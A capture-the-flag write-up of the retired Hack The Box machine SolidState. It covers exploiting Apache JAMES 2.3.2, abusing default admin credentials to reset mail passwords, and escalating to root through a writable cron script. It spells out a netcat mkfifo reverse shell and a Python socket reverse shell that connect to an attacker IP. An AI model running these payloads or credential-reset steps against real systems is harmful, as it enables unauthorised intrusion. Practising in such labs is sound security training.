---
title: SolidState Hackthebox Writeup
date: 2021-01-17 04:00:00 +0800
categories: [Hackthebox, Retired]
tags: [linux,mail,ssh,james,pop3,smtp,cronjob,python]     # TAG names should always be lowercase
image: /assets/img/solidstate-hackthebox/solidstate-pic.png
subtitle: JHBDOcubeoveiubo
---


# Introduction@Solidstate:~$


Column | Details
------------ | -------------
Name | SolidState
IP | 10.10.10.51
Points | 30
Os | Linux
Difficult | Medium
Creator | [ch33zplz](https://www.hackthebox.eu/home/users/profile/3338)
Out on | 8th September 2017 

# Summary:~$

* Discovering the new host and scanning for open ports.
* Found a  `vulnerability` for port 110 i.e. *JAMES pop3d 2.3.2*.
* Made the exploit running by loging in port `4555` i.e *james-admin JAMES Remote Admin 2.3.2* with default credentials **root:root**.
* Accessing mails for other users by changing their `passwords` from *Remote Admin Pannel* on port 4555.
* Got reverse shell as soon as accessed `SSH` for a user.
* Exploited a `cronjob` to escalate privileges.

# Starting:~$

## Nmap

I have used **nmapAutomator** , which keeps the scanning fast and reduces effort.*(Not recommended in real life scenarios).* 

Dowload link: [nmapAutomator](https://github.com/21y4d/nmapAutomator)

___
![](/assets/img/solidstate-hackthebox/nmap-scan-1.png)

Let's access `Port 80`.

___
![](/assets/img/solidstate-hackthebox/port-80-2.png)

Moved around a bit, but didn't find anything interesting. I used `dirbuster` for hidden directories but couldn't find anything.

I used `searchsploit` to check about **JAMES pop3d 2.3.2** which is a `pop3` service.

___
![](/assets/img/solidstate-hackthebox/searchsploit-james-4.png)

It shows Remote Code Execution but before that we need to change the payload present in the python file.

*Original Script*:

___
![](/assets/img/solidstate-hackthebox/update-the-code-on-script-5.png)

Changed it with [Payload](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) 

*Payload--> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.X.X 9999 >/tmp/f*

___
![](/assets/img/solidstate-hackthebox/final-exploit-7.png)

I ran the script once and came to know that when a user will login in `SSH` then only this script will work.

By the time from the `full port scan` I came to know that `Port 4555` is also open.

___
![](/assets/img/solidstate-hackthebox/nmap-scan-new-1.png)

*JAMES Remote Admin 2.3.2* is running. Accessing port `4555` via *telnet*.

___
![](/assets/img/solidstate-hackthebox/accessed-port-4555-james-6.png)

I used default credentials and loggedin. **Credentials**: *root:root*.

Checking the users by using the `help` command.

___
![](/assets/img/solidstate-hackthebox/list-of-users-8.png)

`5 Users` are present i.e:

* james
* mindy
* thomas
* mailadmin
* john

From the `help` command, we have the permission to change the password of any user. Let's do that and acess their respective mails on port `110`.

___
![](/assets/img/solidstate-hackthebox/resetting-passwords-9.png)

Now the username is also the password eg. For user `james` password is `james`.

Mails for `james` and `thomas` were empty but `john` gave us something.

___
![](/assets/img/solidstate-hackthebox/reading-johns-mail-12.png)

Let's access `Mindy's` mail. There are 2 mails for Mindy, Reading the second mail we got the password for `SSH`.

___
![](/assets/img/solidstate-hackthebox/mindy-account-mail-two-14.png)

**Username**: *mindy*
**Password**: *P@55W0rd1!2@*

Now let's listen on the port (*9999*) which I had specified during changing the payload in the `python script`. and login into `SSH`.

___
![](/assets/img/solidstate-hackthebox/running-ssh-and-got-shell-15.png)

As soon as I logged into *SSH*, it didn't respond and we got a shell as `mindy`.

___
![](/assets/img/solidstate-hackthebox/got-shell-as-mindy-16.png)

Got `User Flag`.

For `Privilege Escalation`, downloading [linpeas.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) on victim machine using wget and hosting it on local system.

**Wget Command**: *wget http://10.10.X.X:8081/linpeas.sh*

**Hosting Command**: *python3 -m http.server 8081*

___
![](/assets/img/solidstate-hackthebox/downloading-linpeas-17.png.png)

Running it by giving executable permissions: *chmod +x linpeas.sh*, I found something interesting:

___
![](/assets/img/solidstate-hackthebox/something-interesting-18.png)

___
![](/assets/img/solidstate-hackthebox/permissions-tmp-py-19.png)

The file is owned by `root` but we have write access, further using [pspy32](https://github.com/DominicBreuker/pspy/blob/master/README.md) to detect whether it's a cronjob or not i.e. `tmp.py`.

**Wget Command**: *wget http://10.10.X.X:8081/pspy32*

**Hosting Command**: *python3 -m http.server 8081*

___
![](/assets/img/solidstate-hackthebox/downloading-pspy32-21.png)

Running it by giving executable permissions: *chmod +x pspy32*, Every 3 minutes a cronjob is runnning of tmp.py.

___
![](/assets/img/solidstate-hackthebox/pspy-cronjob-21.png)

Now let's write our `payload` in tmp.py and get `Root`.

___
![](/assets/img/solidstate-hackthbox/changing-data-in-tmp-py-20.png)

[Payload](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet):

*echo '#!/usr/bin/env python' > tmp.py*

*echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.3",8989));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> tmp.py*

Let's listen on `port 8989` using `nc`.

___
![](/assets/img/solidstate-hackthebox/got-root-22.png)

Got `Root`.
